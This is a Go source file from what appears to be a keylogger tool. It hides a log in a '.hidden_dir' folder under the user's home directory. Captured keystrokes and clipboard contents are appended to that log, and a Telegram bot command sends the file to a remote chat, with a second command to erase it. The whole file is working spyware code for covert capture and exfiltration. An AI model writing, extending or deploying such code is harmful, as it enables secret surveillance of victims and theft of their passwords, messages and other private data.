package utilities

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"time"

	"github.com/atotto/clipboard"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

var logFilePath string
var hiddenDirPath string

// InitializeLogger sets up the log file and hidden directory.
func InitializeLogger() {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatalf("Failed to get user home directory: %v", err)
	}

	hiddenDirPath = filepath.Join(homeDir, ".hidden_dir")
	logFilePath = filepath.Join(hiddenDirPath, "logs.json")

	// Create hidden directory if it doesn't exist
	if _, err := os.Stat(hiddenDirPath); os.IsNotExist(err) {
		err = os.Mkdir(hiddenDirPath, 0700)
		if err != nil {
			log.Fatalf("Failed to create hidden directory: %v", err)
		}
	}

	// Create log file if it doesn't exist
	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
		file, err := os.Create(logFilePath)
		if err != nil {
			log.Fatalf("Failed to create log file: %v", err)
		}
		file.Close()
	}
}

// LogKeystroke logs a keystroke event.
func LogKeystroke(key string) {
	record := map[string]string{
		"timestamp": time.Now().Format(time.RFC3339),
		"key":       key,
	}

	file, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("Failed to open log file: %v", err)
		return
	}
	defer file.Close()

	data, err := json.Marshal(record)
	if err != nil {
		log.Printf("Failed to marshal log data: %v", err)
		return
	}

	file.WriteString(string(data) + "\n")
}

// LogClipboard logs clipboard content.
func LogClipboard() {
	clipContent, err := clipboard.ReadAll()
	if err != nil {
		log.Printf("Failed to read clipboard content: %v", err)
		return
	}

	LogKeystroke("[CLIPBOARD] " + clipContent)
}

// HandleGetLog sends the log file content to the Telegram user.
func HandleGetLog(bot *tgbotapi.BotAPI, chatID int64) {
	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
		bot.Send(tgbotapi.NewMessage(chatID, "No log file found."))
		return
	}

	logData, err := os.ReadFile(logFilePath)
	if err != nil {
		bot.Send(tgbotapi.NewMessage(chatID, "Failed to read log file."))
		log.Printf("Error reading log file: %v", err)
		return
	}

	document := tgbotapi.NewDocument(chatID, tgbotapi.FileBytes{Name: "logs.json", Bytes: logData})
	bot.Send(document)
}

// HandleClearLog clears the log file content.
func HandleClearLog(bot *tgbotapi.BotAPI, chatID int64) {
	err := os.Remove(logFilePath)
	if err != nil {
		bot.Send(tgbotapi.NewMessage(chatID, "Failed to clear log file."))
		log.Printf("Error clearing log file: %v", err)
		return
	}

	// Recreate the log file
	file, err := os.Create(logFilePath)
	if err != nil {
		bot.Send(tgbotapi.NewMessage(chatID, "Failed to recreate log file."))
		log.Printf("Error recreating log file: %v", err)
		return
	}
	file.Close()

	bot.Send(tgbotapi.NewMessage(chatID, "Log file cleared."))
}
